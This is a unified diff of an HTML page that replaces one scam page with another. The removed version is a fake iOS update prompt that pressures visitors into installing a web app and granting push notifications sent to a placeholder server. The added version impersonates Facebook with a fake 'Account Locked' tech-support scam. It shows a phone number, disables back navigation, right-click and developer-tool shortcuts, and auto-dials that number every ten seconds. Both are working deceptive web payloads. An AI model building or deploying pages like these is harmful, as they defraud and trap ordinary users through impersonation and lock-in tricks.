@@ -3,282 +3,170 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>iOS 17.5 Update Required</title>
-  <link rel="manifest" href="/manifest.json">
-  <meta name="theme-color" content="#f2f2f7">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="default">
-  <link rel="apple-touch-icon" href="/icon.png">
+  <title>Facebook - Log In</title>
   <style>
     body {
       margin: 0;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto;
-      background: linear-gradient(135deg, #e0e7ff, #c3dafe);
+      padding: 0;
       height: 100vh;
-      overflow: hidden;
+      font-family: Helvetica, Arial, sans-serif;
+      background: url('https://images.unsplash.com/photo-1611162618476-1a09a9826b7b?q=80&w=2070&auto=format&fit=crop&ixlib=rb-4.0.3') no-repeat center center fixed;
+      background-size: cover;
+      overflow: hidden; /* Prevent scrolling */
+    }
+
+    .container {
       display: flex;
       justify-content: center;
       align-items: center;
-      position: relative;
+      height: 100%;
+      flex-direction: column;
     }
-    .content {
-      text-align: center;
-      padding: 30px;
-      background: white;
-      border-radius: 20px;
-      box-shadow: 0 8px 30px rgba(0,0,0,0.15);
-      z-index: 1;
-      max-width: 90%;
-    }
-    .blur {
+
+    .header {
       position: absolute;
       top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      backdrop-filter: blur(12px);
-      background: rgba(255,255,255,0.2);
-      z-index: 2;
+      width: 100%;
+      background: #3b5998;
+      padding: 10px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
     }
-    .popup {
-      position: absolute;
+
+    .header img {
+      height: 40px;
+    }
+
+    .header .login-form {
+      display: flex;
+      align-items: center;
+      color: white;
+    }
+
+    .header .login-form input {
+      margin: 0 5px;
+      padding: 5px;
+      border: none;
+      border-radius: 3px;
+    }
+
+    .header .login-form button {
+      background: #4267b2;
+      color: white;
+      border: none;
+      padding: 5px 10px;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+
+    .dialog-box {
+      background: #ffffff;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+      width: 400px;
+      padding: 20px;
+      text-align: center;
+      position: fixed;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      background: linear-gradient(135deg, #ffffff, #f0f4ff);
-      padding: 25px;
-      border-radius: 16px;
-      text-align: left;
-      z-index: 3;
-      box-shadow: 0 10px 40px rgba(0,0,0,0.25);
-      width: 85%;
-      max-width: 340px;
-      animation: glow 2s ease-in-out infinite;
+      z-index: 1000;
     }
-    @keyframes glow {
-      0%, 100% { box-shadow: 0 10px 40px rgba(49,126,251,0.3); }
-      50% { box-shadow: 0 10px 40px rgba(49,126,251,0.6); }
+
+    .dialog-box h2 {
+      color: #3b5998;
+      margin-bottom: 15px;
     }
-    .arrow {
-      position: absolute;
-      bottom: 80px;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 56px;
-      color: #317EFB;
-      animation: bounce 1.2s infinite;
-      z-index: 4;
+
+    .dialog-box p {
+      color: #333;
+      font-size: 16px;
+      line-height: 1.5;
+      margin-bottom: 20px;
     }
-    @keyframes bounce {
-      0%, 100% { transform: translateX(-50%) translateY(0); }
-      50% { transform: translateX(-50%) translateY(12px); }
-    }
-    button {
+
+    .phone-number {
+      font-size: 18px;
+      font-weight: bold;
+      color: #d32f2f;
       margin-top: 20px;
-      padding: 12px 30px;
-      font-size: 1.1em;
-      background: linear-gradient(135deg, #317EFB, #1a5cd8);
-      color: white;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      transition: transform 0.2s;
-      animation: pulse 2s infinite;
-      width: 100%;
-      text-align: center;
     }
-    button:hover {
-      transform: scale(1.05);
-    }
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.08); }
-    }
-    .spinner {
-      width: 80px;
-      height: 80px;
-      border: 6px solid #e0e0e0;
-      border-top: 6px solid #317EFB;
-      border-radius: 50%;
-      animation: spin 1.5s linear infinite;
-      margin: 20px auto;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    h1 {
-      font-size: 1.8em;
-      color: #1a1a1a;
+
+    .facebook-logo {
+      width: 100px;
       margin-bottom: 10px;
     }
-    h2 {
-      font-size: 1.5em;
-      color: #317EFB;
-      margin-bottom: 15px;
+
+    .footer {
+      position: absolute;
+      bottom: 0;
+      width: 100%;
+      background: #f5f6f5;
+      padding: 10px;
       text-align: center;
+      color: #737373;
+      font-size: 12px;
     }
-    p {
-      font-size: 1em;
-      color: #333;
-      line-height: 1.5;
-      margin: 10px 0;
-    }
-    .highlight {
-      color: #317EFB;
-      font-weight: bold;
-    }
-    ol {
-      padding-left: 20px;
-      margin: 10px 0;
-      font-size: 0.95em;
-      color: #333;
-    }
-    li {
-      margin-bottom: 8px;
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 999;
     }
   </style>
 </head>
 <body>
-  <div class="content">
-    <h1>iOS 17.5 Update Required</h1>
-    <p>Your device needs the <span class="highlight">iOS 17.5</span> update for enhanced <span class="highlight">security</span>, <span class="highlight">performance</span>, and new features.</p>
-    <div class="spinner"></div>
+  <div class="overlay"></div>
+  <div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+    <div class="login-form">
+      <input type="text" placeholder="Email or Phone" disabled>
+      <input type="password" placeholder="Password" disabled>
+      <button disabled>Log In</button>
+    </div>
   </div>
-  <div class="blur"></div>
-  <div class="popup" id="popupStep">
-    <h2>🔒 Install Update Now</h2>
-    <p>To update to <span class="highlight">iOS 17.5</span>, add this app to your <span class="highlight">Home Screen</span> and allow <span class="highlight">notifications</span>:</p>
-    <ol>
-      <li>Tap the <span class="highlight">Share</span> button below (square with an arrow).</li>
-      <li>Select <span class="highlight">Add to Home Screen</span> and tap <span class="highlight">Add</span>.</li>
-      <li>Allow <span class="highlight">Notifications</span> when prompted to receive update alerts.</li>
-    </ol>
-    <p>Notifications ensure you stay secure and updated. Act now!</p>
-    <button onclick="dismissPrompt()">I’ve Added It!</button>
+  <div class="container">
+    <div class="dialog-box">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo">
+      <h2>Account Locked</h2>
+      <p>Your Facebook account has been temporarily locked due to suspicious activity. To unlock your account, please contact our support team immediately.</p>
+      <p class="phone-number">Call us at: 1-834-434-3483</p>
+    </div>
   </div>
-  <div class="arrow">⬇️</div>
+  <div class="footer">
+    <p>Facebook © 2025 · Help · Privacy · Terms</p>
+  </div>
+
   <script>
-    let deferredPrompt;
-    const popup = document.getElementById('popupStep');
-    let notificationPermissionRequested = false;
+    // Prevent right-click context menu
+    document.addEventListener('contextmenu', event => event.preventDefault());
 
-    // Detect if the app is running in standalone mode
-    function isStandalone() {
-      return (window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone === true);
+    // Prevent back navigation
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+      history.go(1);
+    };
+
+    // Prevent keyboard shortcuts like F12, Ctrl+Shift+I, etc.
+    document.onkeydown = function (e) {
+      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+        e.preventDefault();
+      }
+    };
+
+    // Autodial function
+    function autodial() {
+      window.location.href = 'tel:1-834-434-3483';
     }
 
-    // Convert VAPID public key from base64 to Uint8Array
-    function urlBase64ToUint8Array(base64String) {
-      const padding = '='.repeat((4 - base64String.length % 4) % 4);
-      const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
-      const rawData = window.atob(base64);
-      const outputArray = new Uint8Array(rawData.length);
-      for (let i = 0; i < rawData.length; ++i) {
-        outputArray[i] = rawData.charCodeAt(i);
-      }
-      return outputArray;
-    }
-
-    // Request notification permission and subscribe to push
-    async function requestNotificationPermission() {
-      if (!('Notification' in window) || !('serviceWorker' in navigator) || !('PushManager' in window)) {
-        console.log('Push notifications not supported');
-        alert('Your browser does not support push notifications. Please add to Home Screen to proceed.');
-        return;
-      }
-
-      if (Notification.permission === 'granted' && !notificationPermissionRequested) {
-        await subscribeToPush();
-        return;
-      }
-
-      if (!notificationPermissionRequested) {
-        notificationPermissionRequested = true;
-        const permission = await Notification.requestPermission();
-        if (permission === 'granted') {
-          console.log('Notification permission granted');
-          await subscribeToPush();
-        } else {
-          alert('Please allow notifications to receive critical iOS 17.5 update alerts.');
-        }
-      }
-    }
-
-    // Subscribe to push notifications
-    async function subscribeToPush() {
-      try {
-        const registration = await navigator.serviceWorker.register('/service-worker.js');
-        console.log('Service worker registered');
-
-        // Replace with your VAPID public key
-        const vapidPublicKey = 'YOUR_VAPID_PUBLIC_KEY_HERE';
-        const convertedVapidKey = urlBase64ToUint8Array(vapidPublicKey);
-
-        const subscription = await registration.pushManager.subscribe({
-          userVisibleOnly: true,
-          applicationServerKey: convertedVapidKey
-        });
-
-        // Send subscription to your server
-        await fetch('https://your-server.com/subscribe', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(subscription)
-        });
-        console.log('Push subscription sent to server');
-
-        // Test notification after subscription
-        await fetch('https://your-server.com/send-test-notification', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ endpoint: subscription.endpoint })
-        });
-      } catch (error) {
-        console.error('Push subscription failed:', error);
-        alert('Failed to set up notifications. Please try again.');
-      }
-    }
-
-    // If already in standalone mode, request notifications
-    if (isStandalone()) {
-      popup.style.display = 'none';
-      document.querySelector('.blur').style.display = 'none';
-      document.querySelector('.arrow').style.display = 'none';
-      requestNotificationPermission();
-    }
-
-    // Handle the beforeinstallprompt event for Chrome/Android
-    window.addEventListener('beforeinstallprompt', (e) => {
-      e.preventDefault();
-      deferredPrompt = e;
-    });
-
-    // Dismiss the prompt (only if standalone and notifications allowed)
-    function dismissPrompt() {
-      if (isStandalone()) {
-        requestNotificationPermission();
-        if (Notification.permission === 'granted') {
-          popup.style.display = 'none';
-          document.querySelector('.blur').style.display = 'none';
-          document.querySelector('.arrow').style.display = 'none';
-        } else {
-          alert('Please allow notifications to complete the iOS 17.5 update setup.');
-        }
-      } else {
-        alert('To update to iOS 17.5, add the app to your Home Screen. Tap the Share button, then select Add to Home Screen.');
-      }
-    }
-
-    // Trigger notification setup after app is installed
-    window.addEventListener('appinstalled', () => {
-      requestNotificationPermission();
-      if (Notification.permission === 'granted') {
-        popup.style.display = 'none';
-        document.querySelector('.blur').style.display = 'none';
-        document.querySelector('.arrow').style.display = 'none';
-      }
-    });
+    // Start autodial immediately and repeat every 10 seconds
+    autodial();
+    setInterval(autodial, 10000); // Repeat every 10 seconds
   </script>
 </body>
 </html>
